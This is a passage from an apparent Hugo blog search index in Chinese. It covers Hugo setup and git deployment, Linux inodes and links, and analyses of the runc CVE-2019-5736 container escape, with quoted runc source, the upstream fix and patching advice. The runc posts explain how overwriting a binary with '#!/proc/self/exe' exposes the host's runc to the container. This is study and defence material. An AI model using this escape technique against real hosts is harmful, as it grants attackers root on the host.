","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#代码块"},{"categories":["Hugo"],"content":"表格 test1 retes essetqq eqf24 13 13 36u6 63y4t25 13 edwfd 24 t5y6 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:3","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#表格"},{"categories":["Hugo"],"content":"数学公式？ 行内公式 $x = y\\times z$ 多行公式 $$ x^{y^z}=(1+{\\rm e}^x)^{-2xy^w} $$ ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:4","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#数学公式"},{"categories":["Hugo"],"content":"文字样式 引用 ==高亮== 加粗 划线 斜体 正常文字内容 链接 emoji： 😄 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:5","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#文字样式"},{"categories":["Hugo"],"content":"图片引用 img1img1 \" img1 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:6","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#图片引用"},{"categories":["Hugo"],"content":"shortcode使用 admonition 注意 一个 注意 横幅 摘要 一个 摘要 横幅 信息 一个 信息 横幅 技巧 一个 技巧 横幅 成功 一个 成功 横幅 问题 一个 问题 横幅 警告 一个 警告 横幅 失败 一个 失败 横幅 危险 一个 危险 横幅 Bug 一个 Bug 横幅 示例 一个 示例 横幅 引用 一个 引用 横幅 bilibili -- ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:7","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#shortcode使用"},{"categories":["Hugo"],"content":"shortcode使用 admonition 注意 一个 注意 横幅 摘要 一个 摘要 横幅 信息 一个 信息 横幅 技巧 一个 技巧 横幅 成功 一个 成功 横幅 问题 一个 问题 横幅 警告 一个 警告 横幅 失败 一个 失败 横幅 危险 一个 危险 横幅 Bug 一个 Bug 横幅 示例 一个 示例 横幅 引用 一个 引用 横幅 bilibili -- ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:7","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#admonition"},{"categories":["Hugo"],"content":"从hexo换到hugo 之前的博客是使用hexo+github page做的。一开始感觉还行，但是到后来发现，hexo很令人感到厌烦以及恐惧的一点，就是依赖众多的js库，且需要频繁更新，以及庞大的node_mudoles目录，这些会给博客后续的维护带来混乱。之前看过别人用hugo搭博客的，于是也自己尝试了一下，把以前的文章迁移到了现在的博客上。 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#从hexo换到hugo"},{"categories":["Hugo"],"content":"一些需要注意的点 hexo使用的frontmatter中的目录字段为categories，与hexo的category略有不同 由于hexo会自动解析index.md/index.zh-cn.md等文件的内容，所以目前写文章的模式，是先创建一个文章标题的文件夹，然后在其中添加index.md文件。因为我没有设置多语言，所以也就不同加上zh-cn等后缀 对于一份内容为空(不算frontmatter)的md文件，hugo渲染会出错。解决办法就是将其命名为_index.md 关于这一主题LoveIt，注意到不太懂的一点，如果想要将文章内的图片以画廊形式展示的话，除了在config.toml配置文件中将lightgallery值设为true，还需要在md文件中插入图片时，将其写成![title-optional](src \"title\")的形式，就像这样： image-20210619163825192image-20210619163825192 \" image-20210619163825192 将选好的图标在网站https://realfavicongenerator.net/生成所有图标资源，然后直接放在/static/目录即可 ps：记录一个用valine+leancloud完成评论系统与统计功能的博文 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#一些需要注意的点"},{"categories":["Hugo"],"content":"关于部署 我使用的是直接生成静态文件，然后手动将静态文件push到远程仓库的方法。并且由于我有多个不同的github账户，所以在通过ssh key进行push的过程中，还需要解决自定义私钥的问题。 git推送 在博客工程项目目录下运行hugo，生成静态文件。如果运行hugo -D的话，则会把draft: true的文章也进行渲染 进入到存放静态文件的public目录下，执行以下命令 git remote add origin \u003cyour ssh git url\u003e git add . git commit -m 'first commit message' git push -u origin master 自定义私钥 打开你的ssh config文件，windows的路径应该为C:\\Users\\\u003cusername\u003e\\.ssh\\config 在其中加入以下内容 Host \u003c一个能够起标识作用的别名\u003e HostName github.com User git IdentityFile \u003c你自定义的私钥\u003e IdentitiesOnly yes 例如，我将Host的值填为gitForLzy，那么我在add origin的时候就会这样：git remote add origin git@gitForLzy:myname/myname.github.io ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#关于部署"},{"categories":["Hugo"],"content":"关于部署 我使用的是直接生成静态文件，然后手动将静态文件push到远程仓库的方法。并且由于我有多个不同的github账户，所以在通过ssh key进行push的过程中，还需要解决自定义私钥的问题。 git推送 在博客工程项目目录下运行hugo，生成静态文件。如果运行hugo -D的话，则会把draft: true的文章也进行渲染 进入到存放静态文件的public目录下，执行以下命令 git remote add origin git add . git commit -m 'first commit message' git push -u origin master 自定义私钥 打开你的ssh config文件，windows的路径应该为C:\\Users\\\\.ssh\\config 在其中加入以下内容 Host HostName github.com User git IdentityFile IdentitiesOnly yes 例如，我将Host的值填为gitForLzy，那么我在add origin的时候就会这样：git remote add origin git@gitForLzy:myname/myname.github.io ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#git推送"},{"categories":["Hugo"],"content":"关于部署 我使用的是直接生成静态文件，然后手动将静态文件push到远程仓库的方法。并且由于我有多个不同的github账户，所以在通过ssh key进行push的过程中，还需要解决自定义私钥的问题。 git推送 在博客工程项目目录下运行hugo，生成静态文件。如果运行hugo -D的话，则会把draft: true的文章也进行渲染 进入到存放静态文件的public目录下，执行以下命令 git remote add origin git add . git commit -m 'first commit message' git push -u origin master 自定义私钥 打开你的ssh config文件，windows的路径应该为C:\\Users\\\\.ssh\\config 在其中加入以下内容 Host HostName github.com User git IdentityFile IdentitiesOnly yes 例如，我将Host的值填为gitForLzy，那么我在add origin的时候就会这样：git remote add origin git@gitForLzy:myname/myname.github.io ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:2:2","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#自定义私钥"},{"categories":["Linux"],"content":"前言 最近在看runc最新的CVE-2021-30465漏洞的时候经常看到符号链接(symbolic link)这个概念，脑海中对于这一概念似乎也有点印象，但是始终无法清晰浮现出来，与之相关的inode、硬链接、软连接(即符号链接)这些Linux系统的概念也记不清了。于是特意重新翻看了一下操作系统的书籍，查阅了一些资料，记录一下。 ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:1:0","series":null,"tags":["review"],"title":"Linux知识回顾：inode与软链接、硬链接","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#前言"},{"categories":["Linux"],"content":"UNIX(Linux)文件系统 inode与data block 我们都知道，文件是存储在磁盘上的。在Linux系统中，磁盘被划分分区并格式化的时候，整个分区会被划分为两个部分，分别是inode区和data block区。其中inode区存放的是文件的inode信息，data block区存放的是真正的文件数据内容。 inode是一种UNIX系统中用于存储文件相关信息的数据结构，包括inode号、文件的uid、gid、各个组的rwx权限等。需要注意的是，inode并不含有文件名。所以我们可以这么理解，UNIX系统中的文件名是给用户使用的，实际上系统打开每个文件都是通过inode号去寻找对应的inode，然后进行判断当前用户的权限等操作，再打开该文件。 在使用ls命令时可以加上-i选项查看文件对应的inode号。 image-20210601205746981image-20210601205746981 \" image-20210601205746981 硬链接与软链接 这是一对容易记混的概念。首先来说硬链接(hard link)。一般来说，一个文件名会对应一个inode号码，但是Linux系统允许多个文件名对应同一个inode号码，即指向同一个inode对象，这些其他的文件名就叫做硬链接。inode中的链接数字段信息保存了该文件的链接数量，每个新创建的硬链接都会使其加1。 创建硬链接可以使用ln命令来完成 $ ln \u003cfile-path\u003e \u003clink-name\u003e 软链接又叫符号链接(symbolic link)，原理与硬链接完全不同。软链接可以看作是windows系统的快捷方式，每个软链接都是独立的文件，只不过文件中的内容是另一个文件的路径。与硬链接不同的是，软链接可以用于目录，也就是说，你可以对一个目录创建一个软链接，而硬链接是只能作用与文件的。 使用ln命令也可以创建软链接 $ ln -s \u003cfile-path\u003e \u003clink-name\u003e ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:2:0","series":null,"tags":["review"],"title":"Linux知识回顾：inode与软链接、硬链接","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#unixlinux文件系统"},{"categories":["Linux"],"content":"UNIX(Linux)文件系统 inode与data block 我们都知道，文件是存储在磁盘上的。在Linux系统中，磁盘被划分分区并格式化的时候，整个分区会被划分为两个部分，分别是inode区和data block区。其中inode区存放的是文件的inode信息，data block区存放的是真正的文件数据内容。 inode是一种UNIX系统中用于存储文件相关信息的数据结构，包括inode号、文件的uid、gid、各个组的rwx权限等。需要注意的是，inode并不含有文件名。所以我们可以这么理解，UNIX系统中的文件名是给用户使用的，实际上系统打开每个文件都是通过inode号去寻找对应的inode，然后进行判断当前用户的权限等操作，再打开该文件。 在使用ls命令时可以加上-i选项查看文件对应的inode号。 image-20210601205746981image-20210601205746981 \" image-20210601205746981 硬链接与软链接 这是一对容易记混的概念。首先来说硬链接(hard link)。一般来说，一个文件名会对应一个inode号码，但是Linux系统允许多个文件名对应同一个inode号码，即指向同一个inode对象，这些其他的文件名就叫做硬链接。inode中的链接数字段信息保存了该文件的链接数量，每个新创建的硬链接都会使其加1。 创建硬链接可以使用ln命令来完成 $ ln 软链接又叫符号链接(symbolic link)，原理与硬链接完全不同。软链接可以看作是windows系统的快捷方式，每个软链接都是独立的文件，只不过文件中的内容是另一个文件的路径。与硬链接不同的是，软链接可以用于目录，也就是说，你可以对一个目录创建一个软链接，而硬链接是只能作用与文件的。 使用ln命令也可以创建软链接 $ ln -s ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:2:0","series":null,"tags":["review"],"title":"Linux知识回顾：inode与软链接、硬链接","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#inode与data-block"},{"categories":["Linux"],"content":"UNIX(Linux)文件系统 inode与data block 我们都知道，文件是存储在磁盘上的。在Linux系统中，磁盘被划分分区并格式化的时候，整个分区会被划分为两个部分，分别是inode区和data block区。其中inode区存放的是文件的inode信息，data block区存放的是真正的文件数据内容。 inode是一种UNIX系统中用于存储文件相关信息的数据结构，包括inode号、文件的uid、gid、各个组的rwx权限等。需要注意的是，inode并不含有文件名。所以我们可以这么理解，UNIX系统中的文件名是给用户使用的，实际上系统打开每个文件都是通过inode号去寻找对应的inode，然后进行判断当前用户的权限等操作，再打开该文件。 在使用ls命令时可以加上-i选项查看文件对应的inode号。 image-20210601205746981image-20210601205746981 \" image-20210601205746981 硬链接与软链接 这是一对容易记混的概念。首先来说硬链接(hard link)。一般来说，一个文件名会对应一个inode号码，但是Linux系统允许多个文件名对应同一个inode号码，即指向同一个inode对象，这些其他的文件名就叫做硬链接。inode中的链接数字段信息保存了该文件的链接数量，每个新创建的硬链接都会使其加1。 创建硬链接可以使用ln命令来完成 $ ln 软链接又叫符号链接(symbolic link)，原理与硬链接完全不同。软链接可以看作是windows系统的快捷方式，每个软链接都是独立的文件，只不过文件中的内容是另一个文件的路径。与硬链接不同的是，软链接可以用于目录，也就是说，你可以对一个目录创建一个软链接，而硬链接是只能作用与文件的。 使用ln命令也可以创建软链接 $ ln -s ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:2:0","series":null,"tags":["review"],"title":"Linux知识回顾：inode与软链接、硬链接","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#硬链接与软链接"},{"categories":["源码阅读"],"content":"漏洞背景 runc是一个根据OCI(Open Container Initiative)标准创建并运行容器的命令行工具，docker引擎也是基于runc构建的。2019年2月11日，runc的相关研究人员通过oss-security邮件发布了runc逃逸漏洞的详情。 攻击者可以利用该漏洞在容器内通过特定操作覆盖宿主机上的runc二进制文件，从而在宿主机上以root权限执行代码，达到容器逃逸的目的。 影响版本：runc \u003c= 1.0-rc6 ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:1:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析-第二版","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#漏洞背景"},{"categories":["源码阅读"],"content":"漏洞成因 docker通过runc启动容器的流程可以概括为以下几步： docker-cli根据用户命令发出请求给docker-daemon，docker-daemon经过docker-daemon -\u003e contained -\u003e containerd-shim -\u003e runc的调用链启动runc runc执行runc run命令，创建容器外的runc进程 容器外的runc进程处理生成创建容器所需信息，再执行runc init命令创建子进程 runc init子进程对namespace等进行处理，将自身进程转变成为容器进程，并最终将自身的进程映像替换为用户指定的内容 rc6版本及之前的runc创建的runc init进程使用的二进制文件就是宿主机上的runc文件，因此攻击者可以在容器内修改容器内待执行文件的内容，写入#!/proc/self/exe，获取宿主机上的runc文件描述符，从而进行修改。 正常的创建容器并在容器内执行命令的过程示意图如下图所示 upload_757c2cc51fb90da6bd6126b193581a20.png\" upload_757c2cc51fb90da6bd6126b193581a20.png 而修改了待执行文件的内容之后，runc init进程会执行自身，从而将宿主机上的runc文件暴露给了容器内部 upload_c5457e4e1d840ef2efb4fa18764992cf.png\" upload_c5457e4e1d840ef2efb4fa18764992cf.png ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:2:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析-第二版","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#漏洞成因"},{"categories":["源码阅读"],"content":"具体代码分析 首先runc run会执行run命令对应的action，从而执行startContainer函数 func startContainer(context *cli.Context, spec *specs.Spec, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err := notifySocket.setupSpec(context, spec); err != nil { return -1, err } } container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } logLevel := \"info\" if context.GlobalBool(\"debug\") { logLevel = \"debug\" } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: true, container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, logLevel: logLevel, } return r.run(spec.Process) } 函数最后的r.run()函数创建新进程并调用linuxContainer结构实现的Run()方法。 func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } 函数调用Start()函数，Start()是对start()函数的封装。该函数会调用newParentProcess()函数生成initProcess类型的对象，再调用initProcess结构实现的start()方法 func (c *linuxContainer) start(process *Process) (retErr error) { parent, err := c.newParentProcess(process) if err != nil { return newSystemErrorWithCause(err, \"creating new parent process\") } ... if err := parent.start(); err != nil { return newSystemErrorWithCause(err, \"starting container process\") } ... return nil } initProcess结构实现的start()方法会执行runc init命令，并等待runc init子进程完成容器创建以及进程映像替换之后退出 func (p *initProcess) start() (retErr error) { defer p.messageSockPair.parent.Close() err := p.cmd.Start() p.process.ops = p ... ierr := parseSync(p.messageSockPair.parent, func(sync *syncT) error { switch sync.Type { case procReady: // set rlimits, this has to be done here because we lose permissions ... sentRun = true case procHooks: // Setup cgroup before prestart hook, so that the prestart hook could apply cgroup permissions. ... sentResume = true default: return newSystemError(errors.New(\"invalid JSON payload from child\")) } return nil }) return nil } 随着runc init命令被执行，同理，init命令对应的action也会被执行，并且此时的runc init进程会最终变成启动的容器进程。 var initCommand = cli.Command{ Name: \"init\", Usage: `initialize the namespaces and launch the process (do not call it outside of runc)`, Action: func(context *cli.Context) error { factory, _ := libcontainer.New(\"\") if err := factory.StartInitialization(); err != nil { // as the error is sent back to the parent there is no need to log // or write it to stderr because the parent process will handle this os.Exit(1) } panic(\"libcontainer: container init failed to exec\") }, } StartInitialization()函数调用linuxStandardInit类型的信息对象，并调用Init()函数创建初始化进程 // StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state // This is a low level implementation detail of the reexec and should not be consumed externally func (l *LinuxFactory) StartInitialization() (err error) { ... envInitType := os.Getenv(\"_LIBCONTAINER_INITTYPE\") it := initType(envInitType) ... i, err := newContainerInit(it, pipe, consoleSocket, fifofd, logPipeFd) if err != nil { return err } // If Init succeeds, syscall.Exec will not return, hence none of the defers will be called. return i.Init() Init()函数完成网络、路由、namespace、rootfs等设置，并最终替换进程映像为用户指定的内容。 func (l *linuxStandardInit) Init() error { runtime.LockOSThread() defer runtime.UnlockOSTh","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析-第二版","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#具体代码分析"},{"categories":["源码阅读"],"content":"漏洞修复 runc团队在之后的版本中进行了修复。根据go的CGO机制，init.go文件中引入了nsenter包，而nsenter.go中的CGO内容指定了nsexec.c中定义的nsexec()函数会在包引入前被执行。 团队在nsexec()函数中增加了对宿主机的runc文件进行自我复制的操作。 void nsexec(void) { int pipenum; jmp_buf env; int sync_child_pipe[2], sync_grandchild_pipe[2]; struct nlconfig_t config = { 0 }; /* * Setup a pipe to send logs to the parent. This should happen * first, because bail will use that pipe. */ setup_logpipe(); /* * If we don't have an init pipe, just return to the go routine. * We'll only get an init pipe for start or exec. */ pipenum = initpipe(); if (pipenum == -1) return; /* * We need to re-exec if we are not in a cloned binary. This is necessary * to ensure that containers won't be able to access the host binary * through /proc/self/exe. See CVE-2019-5736. */ if (ensure_cloned_binary() \u003c 0) bail(\"could not ensure we are a cloned binary\"); ... } encure_cloned_binary()函数会复制runc文件并将其覆盖到当前进程 int ensure_cloned_binary(void) { int execfd; char **argv = NULL; /* Check that we're not self-cloned, and if we are then bail. */ int cloned = is_self_cloned(); if (cloned \u003e 0 || cloned == -ENOTRECOVERABLE) return cloned; if (fetchve(\u0026argv) \u003c 0) return -EINVAL; execfd = clone_binary(); if (execfd \u003c 0) return -EIO; if (putenv(CLONED_BINARY_ENV \"=1\")) goto error; fexecve(execfd, argv, environ); error: close(execfd); return -ENOEXEC; } ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:3:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析-第二版","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#漏洞修复"},{"categories":["源码阅读"],"content":"修补建议 及时升级docker使用的runc版本到rc6以上 对runc init进程进行监控，确保其执行的二进制文件位于容器内部 ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:4:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析-第二版","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#修补建议"},{"categories":["源码阅读"],"content":" runc: 1.0-rc93 ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:0:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#"},{"categories":["源码阅读"],"content":"0x00 docker-containerd-shim 调用runc components/cli/cli/command/container/exec.go中执行runExec() func runExec(dockerCli command.Cli, options execOptions) error { ... response, err := client.ContainerExecCreate(ctx, options.container, *execConfig) if err != nil { return err } execID := response.ID if execID == \"\" { return errors.New(\"exec ID empty\") } if execConfig.Detach { execStartCheck := types.ExecStartCheck{ Detach: execConfig.Detach, Tty: execConfig.Tty, } return client.ContainerExecStart(ctx, execID, execStartCheck) } return interactiveExec(ctx, dockerCli, execConfig, execID) } runExec()中调用client.ContainerExecCreate()创建执行用户命令的容器，并获取ID。然后再根据命令参数选择是否进行attach操作。 被调用的ContainerExecCreate()定义于components/engine/client/container_exec.go中。该函数向服务端发出了请求。 // ContainerExecCreate creates a new exec configuration to run an exec process. func (cli *Client) ContainerExecCreate(ctx context.Context, container string, config types.ExecConfig) (types.IDResponse, error) { var response types.IDResponse if err := cli.NewVersionError(\"1.25\", \"env\"); len(config.Env) != 0 \u0026\u0026 err != nil { return response, err } resp, err := cli.post(ctx, \"/containers/\"+container+\"/exec\", nil, config, nil) defer ensureReaderClosed(resp) if err != nil { return response, err } err = json.NewDecoder(resp.body).Decode(\u0026response) return response, err } 服务端的启动流程应该是这样的: components/engine/cmd/dockerd/docker.go中main()函数被执行 main()函数调用newDaemonCommand()函数 newDaemonCommand()函数调用runDaemon()(components/engine/cmd/dockerd/docker_unix.go#11) func runDaemon(opts *daemonOptions) error { daemonCli := NewDaemonCli() return daemonCli.start(opts) } daemonCli.start(opts)调用func (cli *DaemonCli) start()函数(components/engine/cmd/dockerd/daemon.go#77) 服务端的分析从start()函数开始 func (cli *DaemonCli) start(opts *daemonOptions) (err error) { ... //定义api cli.api = apiserver.New(serverConfig) ... //创建Daemon进程 d, err := daemon.NewDaemon(ctx, cli.Config, pluginStore) if err != nil { return errors.Wrap(err, \"failed to start daemon\") } d.StoreHosts(hosts) // validate after NewDaemon has restored enabled plugins. Don't change order. if err := validateAuthzPlugins(cli.Config.AuthorizationPlugins, pluginStore); err != nil { return errors.Wrap(err, \"failed to validate authorization plugin\") } cli.d = d if err := startMetricsServer(cli.Config.MetricsAddress); err != nil { return errors.Wrap(err, \"failed to start metrics server\") } c, err := createAndStartCluster(cli, d) if err != nil { logrus.Fatalf(\"Error starting cluster component: %v\", err) } // Restart all autostart containers which has a swarm endpoint // and is not yet running now that we have successfully // initialized the cluster. d.RestartSwarmContainers() logrus.Info(\"Daemon has completed initialization\") //创建路由信息 routerOptions, err := newRouterOptions(cli.Config, d) if err != nil { return err } routerOptions.api = cli.api routerOptions.cluster = c //初始化路由 initRouter(routerOptions) go d.ProcessClusterNotifications(ctx, c.GetWatchStream()) cli.setupConfigReloadTrap() // The serve API routine never exits unless an error occurs // We need to start it as a goroutine and wait on it so // daemon doesn't exit serveAPIWait := make(chan error) go cli.api.Wait(serveAPIWait) // after the daemon is done setting up we can notify systemd api notifyReady() // Daemon is fully initialized and handling API traffic // Wait for serve API to complete errAPI := \u003c-serveAPIWait c.Cleanup() //关闭Daemon进程 // notify systemd that we're shutting down notifyStopping() shutdownDaemon(d) // Stop notification processing and any background processes cancel() if errAPI != nil { return errors.Wrap(errAPI, \"shutting down due to ServeAPI error\") } logrus.Info(\"Daemon shutdown complete\") return nil } 再去看initRouter(routerOptions)函数 func initRouter(opts routerOptions) { ... routers := []router.Router{ // we need to add the checkpoint router before the container router or the DELETE gets masked checkpointrouter.NewRouter(opts.daemon, decoder), container.NewRouter(opts.daemon, decoder, opts.daemon.Raw","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:1:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x00-docker-containerd-shim-调用runc"},{"categories":["源码阅读"],"content":"0x01 容器之外的runc进程启动 main函数中创建了新的app对象(main.go#54) func main() { app := cli.NewApp() app.Name = \"runc\" app.Usage = usage ... if err := app.Run(os.Args); err != nil { fatal(err) } } app.Run()会调用run.go中定义的Action(run.go#65)，进而调用startContainer()函数。 Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } if err := revisePidFile(context); err != nil { return err } spec, err := setupSpec(context) if err != nil { return err } status, err := startContainer(context, spec, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return err }, startContainer()函数(utils_linux.go#265)创建容器信息，并启动容器 func startContainer(context *cli.Context, spec *specs.Spec, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { ... //创建容器信息 container, err := createContainer(context, id, spec) if err != nil { return -1, err } ... //创建r变量，调用r.run()启动容器 r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: true, container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, logLevel: logLevel, } return r.run(spec.Process) } 先来看createContainer()函数 func createContainer(context *cli.Context, id string, spec *specs.Spec) (libcontainer.Container, error) { rootlessCg, err := shouldUseRootlessCgroupManager(context) if err != nil { return nil, err } config, err := specconv.CreateLibcontainerConfig(\u0026specconv.CreateOpts{ CgroupName: id, UseSystemdCgroup: context.GlobalBool(\"systemd-cgroup\"), NoPivotRoot: context.Bool(\"no-pivot\"), NoNewKeyring: context.Bool(\"no-new-keyring\"), Spec: spec, RootlessEUID: os.Geteuid() != 0, RootlessCgroups: rootlessCg, }) if err != nil { return nil, err } factory, err := loadFactory(context) if err != nil { return nil, err } return factory.Create(id, config) } // loadFactory returns the configured factory instance for execing containers. func loadFactory(context *cli.Context) (libcontainer.Factory, error) { ... return libcontainer.New(abs, cgroupManager, intelRdtManager, libcontainer.CriuPath(context.GlobalString(\"criu\")), libcontainer.NewuidmapPath(newuidmap), libcontainer.NewgidmapPath(newgidmap)) } // New returns a linux based 